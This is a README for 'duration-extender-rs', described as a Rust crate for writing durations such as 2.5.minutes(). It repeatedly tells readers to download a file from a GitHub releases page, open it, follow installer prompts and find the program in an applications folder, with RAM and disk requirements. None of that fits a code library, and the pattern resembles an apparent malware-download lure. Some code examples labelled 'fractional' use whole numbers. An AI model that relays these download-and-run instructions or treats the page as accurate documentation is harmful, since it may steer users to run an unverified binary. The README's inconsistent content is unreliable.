# 🌟 duration-extender-rs - Simplify Your Time Handling in Rust

[![Download duration-extender-rs](https://img.shields.io/badge/Download%20Now-Get%20Started!-blue.svg)](https://github.com/Lvsty294/duration-extender-rs/releases)

## 📖 Introduction

Welcome to `duration-extender-rs`, a simple tool that helps you work with time in Rust without complication. This software provides easy ways to create duration objects, making tasks like setting timeouts and delays clear and intuitive.

You no longer have to write verbose code. Instead, you can use methods that read like natural language. This crate is designed for users who want to manage time easily and effectively.

## 🚀 Getting Started

To use `duration-extender-rs`, follow these simple steps:

1. **Visit the Releases Page**  
   Click [here to download](https://github.com/Lvsty294/duration-extender-rs/releases). This page contains the latest version of the application.

2. **Download the Latest Version**  
   Look for the most recent release. Click on the corresponding link to download the file to your computer.

3. **Install the Software**  
   Once the file downloads, locate it in your downloads folder. Open it and follow the on-screen instructions to complete the installation.

4. **Run the Application**  
   After installation, you can start using the application. You may find it in your applications folder, or search for it using your device's search feature.

## ⚙️ System Requirements

`duration-extender-rs` requires minimal resources to function. Here are the system requirements:

- **Operating System:** This application works well on Windows, macOS, and Linux systems.
- **RAM:** At least 2 GB of RAM is recommended.
- **Storage:** You will need a minimum of 50 MB of free disk space.

## 🛠️ Features

`duration-extender-rs` comes with a variety of features to simplify your time handling tasks:

- **Easy Duration Creation:** Create time durations using simple methods like `.seconds()`, `.minutes()`, `.hours()`, etc.
  
- **Fractional Durations Support:** Version 0.5.0 introduces support for fractional durations. For example:
    ```rust
    let half_second = 0.5.seconds();
    let five_minutes = 5.minutes();
    ```
  
- **Clear Code:** Write expressive code that anyone can read, without complex syntax. 

## ⚠️ What's New in v0.5.0

In this version, we added the ability to handle fractional durations. With this new feature, you can easily create durations that are not whole numbers. Here’s a quick example:
```rust
let two_and_half_minutes = 2.5.minutes();
```

Thanks to community feedback, this update enhances usability significantly.

## ⚠️ Breaking Changes in v0.4.0

Be aware that v0.4.0 included some breaking changes. The methods `.days()` and `.weeks()` were removed. If you relied on these methods, please adjust your code accordingly.

## 📥 Download & Install

To get started with `duration-extender-rs`, please visit the [Releases Page](https://github.com/Lvsty294/duration-extender-rs/releases) to download the current version. Follow the installation steps outlined above to enjoy the new features and improvements.

## 🔍 Usage Examples

Here are some usage examples to get you started:

1. **Creating Simple Durations:**
   ```rust
   let timeout = 30.seconds();
   let delay = 5.minutes();
   ```

2. **Creating Fractional Durations:**
   ```rust
   let thirty_seconds = 0.5.minutes();
   let two_hours = 2.hours();
   ```

3. **Expressive Timeouts:**
   With `duration-extender-rs`, you can express timeouts and delays in ways that are easy to read and understand, enhancing your code's clarity.

## 📞 Support

If you encounter any issues or have questions, you can post them in the Issues section of the GitHub repository. The community and maintainers are eager to help you.

## 📜 License

`duration-extender-rs` is licensed under the MIT and Apache-2.0 licenses. You can review the full details in the LICENSE file included in the repository.

Visit [here to download](https://github.com/Lvsty294/duration-extender-rs/releases) and start simplifying your time handling with `duration-extender-rs` today.